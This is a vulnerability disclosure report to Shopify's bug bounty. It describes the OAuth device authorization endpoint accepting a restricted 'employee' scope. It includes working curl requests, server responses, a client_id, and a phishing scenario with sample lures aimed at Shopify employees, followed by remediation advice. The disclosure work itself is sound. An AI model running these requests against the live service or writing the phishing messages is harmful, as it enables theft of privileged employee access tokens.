# HackerOne Bug Report — Shopify

## Title
OAuth Device Authorization Flow Bypasses `employee` Scope Restriction on accounts.shopify.com

---

## Weakness
CWE-863: Incorrect Authorization  
OWASP: A01:2021 Broken Access Control

---

## Severity
**High** (with Shopify's 2x auth multiplier → likely $10,000–$40,000 range)

CVSS v3.1: `AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N` = **8.7 (High)**

---

## Summary

The `accounts.shopify.com` OAuth server inconsistently enforces scope validation between the
standard authorization code flow and the device authorization flow (RFC 8628).

The `employee` scope — which represents internal Shopify employee-level access — is correctly
rejected by `GET /oauth/authorize` with `error=invalid_scope`. However, the same scope is
**silently accepted** by `POST /oauth/device_authorization`, returning a valid `device_code`,
`user_code`, and activation URL.

This inconsistency allows an attacker to initiate a device flow requesting `scope=employee`,
then send a pre-filled activation URL to a Shopify employee. If the employee authorizes the
request (believing it to be legitimate), the attacker receives an employee-scoped access token.

---

## Technical Details

### The `employee` scope

Shopify's OIDC discovery document (`https://accounts.shopify.com/.well-known/openid-configuration`)
publicly exposes `employee` in `scopes_supported`. This scope is used internally for Shopify
employee authentication and grants access to internal systems. It is **intentionally restricted**
from external clients, as evidenced by the proper rejection in the authorization_code flow.

### Proof of Inconsistency

**Step 1 — employee scope is rejected in authorization_code flow (correct behavior):**

```
GET https://accounts.shopify.com/oauth/authorize
  ?client_id=fbdb2649-e327-4907-8f67-908d24cfd7e3
  &response_type=code
  &scope=employee
  &redirect_uri=http://127.0.0.1:3456
  &state=csrf_state
  &code_challenge=E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM
  &code_challenge_method=S256

HTTP/2 302
Location: http://127.0.0.1:3456?error=invalid_scope&error_description=The+requested+scope+is+invalid%2C+unknown%2C+or+malformed.&state=csrf_state
```

**Step 2 — employee scope is ACCEPTED in device_authorization flow (vulnerability):**

```
POST https://accounts.shopify.com/oauth/device_authorization
Content-Type: application/x-www-form-urlencoded

client_id=fbdb2649-e327-4907-8f67-908d24cfd7e3&scope=employee

HTTP/2 200
Content-Type: application/json

{
    "verification_uri": "https://shopify.com/activate",
    "verification_uri_complete": "https://accounts.shopify.com/activate-with-code?device_code%5Buser_code%5D=DBKR-HLZM",
    "expires_in": 599,
    "interval": 5,
    "device_code": "b02d844f-08d2-4b91-98d6-d3cbcface01b",
    "user_code": "DBKR-HLZM"
}
```

The server returns a complete, valid device authorization response — including a ready-to-use
activation URL — without any scope error.

---

## Attack Scenario

### Attacker Prerequisites
- No Shopify account required
- No authentication needed
- Only HTTP access to `accounts.shopify.com`

### Steps

1. **Attacker initiates device authorization** requesting `scope=employee`:

   ```bash
   curl -s https://accounts.shopify.com/oauth/device_authorization \
     -X POST \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "client_id=fbdb2649-e327-4907-8f67-908d24cfd7e3&scope=employee"
   ```

   Response includes:
   - `device_code` — secret code the attacker will poll with
   - `user_code` — short code displayed or pre-filled for the victim
   - `verification_uri_complete` — magic link: `https://accounts.shopify.com/activate-with-code?device_code[user_code]=XXXX-XXXX`

2. **Attacker sends `verification_uri_complete` to a Shopify employee** via:
   - Targeted phishing email ("Your Shopify CLI session needs re-authorization")
   - Slack message in a compromised workspace
   - Embedded link in a document or support ticket

   The link is a **legitimate `accounts.shopify.com` URL** — no spoofing involved.

3. **Employee clicks the link**, sees a Shopify-branded activation page, and clicks "Authorize"
   (they believe they are completing a legitimate CLI authentication).

4. **Attacker polls** until authorization completes:

   ```bash
   curl -s https://accounts.shopify.com/oauth/token \
     -X POST \
     -d "grant_type=urn:ietf:params:oauth:grant-type:device_code&device_code=b02d844f-08d2-4b91-98d6-d3cbcface01b&client_id=fbdb2649-e327-4907-8f67-908d24cfd7e3"
   ```

   After the employee authorizes: **response contains an employee-scoped access token**.

---

## Why verification_uri_complete Makes This Worse

Standard device code phishing requires the victim to:
1. Visit `https://shopify.com/activate`
2. Manually type the user_code (e.g., `DBKR-HLZM`)
3. Click authorize

With `verification_uri_complete`, the attacker can send a single URL that pre-fills the code.
The victim only needs to click the link and then click "Authorize". This significantly lowers
the friction required for successful phishing.

RFC 9700 (OAuth 2.0 Security Best Current Practice) Section 4.5 specifically warns that
device_code phishing is a realistic threat and that implementations should consider limiting
the utility of `verification_uri_complete`.

---

## No Rate Limiting

The `/oauth/device_authorization` endpoint does not rate-limit requests. An attacker can
generate unlimited device codes requesting `employee` scope, maintaining multiple parallel
phishing campaigns or re-sending codes to multiple targets:

```
Request 1: MSSF-CNPH ✓
Request 2: SWWH-SDGD ✓
Request 3: QKKF-QRFF ✓
Request 4: CTZB-BXCH ✓
Request 5: WMWW-FVLQ ✓
Request 6: GZXB-SVFH ✓
Request 7: JSLV-LNMV ✓
Request 8: SCWC-HRSS ✓
```

All 8 rapid requests return valid codes with no rate limiting.

---

## Additional Context

**Client ID source:** The client_id `fbdb2649-e327-4907-8f67-908d24cfd7e3` is the production
identity client for the Shopify CLI, found in the open-source repository at:
`https://github.com/Shopify/cli/blob/main/packages/cli-kit/src/private/node/session/identity.ts`

This is a public client (no client_secret) using PKCE, which is appropriate for CLI tools.
However, it means anyone can initiate flows using this client_id.

**OIDC Discovery confirms `employee` scope exists:**
`https://accounts.shopify.com/.well-known/openid-configuration` lists `employee` in
`scopes_supported`, confirming it is a real, active scope.

---

## Impact

If a Shopify employee is tricked into authorizing this device code:
- The attacker obtains an `employee`-scoped access token
- This token likely grants access to internal Shopify systems, admin tools, or privileged
  APIs that regular merchants cannot access
- The attack is highly convincing because the activation URL is on a legitimate `accounts.shopify.com` domain
- The attack requires no technical vulnerability on the employee's machine or browser
- The 10-minute expiry window (`expires_in: 599`) is ample time to send and receive authorization

---

## Remediation

**Primary fix:** Apply the same scope validation logic to `POST /oauth/device_authorization`
that already exists in `GET /oauth/authorize`. The `employee` scope should be rejected at
device_authorization time with `error=invalid_scope`, just as it is in the authorization_code flow.

**Additional hardening:**
1. Add rate limiting on `POST /oauth/device_authorization` per IP/client_id
2. Consider omitting or protecting `verification_uri_complete` (the pre-filled magic link)
3. Display the requested scopes explicitly on the `/activate-with-code` page so employees
   can notice when an `employee` scope is being requested via a device they didn't initiate
4. Add a visual indicator or extra confirmation step for privileged scope authorization requests

---

## Test Artifacts

All tests were performed against `accounts.shopify.com` using the publicly-available
Shopify CLI client_id. No merchant or employee accounts were accessed. No data was exfiltrated.
The device codes generated during testing have expired (TTL: 10 minutes).

**Test date:** 2026-07-01
**Tested by:** tanmaymish78@gmail.com
